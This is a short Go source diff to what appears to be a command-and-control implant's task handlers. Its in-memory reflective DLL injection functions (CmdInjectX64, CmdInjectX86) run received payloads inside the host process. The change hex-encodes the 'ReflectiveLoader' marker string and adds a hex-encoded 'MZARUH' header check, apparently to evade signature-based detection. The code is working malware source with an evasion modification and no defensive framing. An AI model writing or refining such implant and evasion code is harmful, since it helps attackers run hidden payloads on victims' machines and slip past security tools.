@@ -3,6 +3,7 @@ package services
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -325,7 +326,9 @@ func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 }
 
 func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
-	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+	rx64, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
+	rHead, _ := hex.DecodeString("4d5a41525548")
+	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
@@ -333,7 +336,9 @@ func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
-	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+	rx86, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
+	rHead, _ := hex.DecodeString("4d5a41525548")
+	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
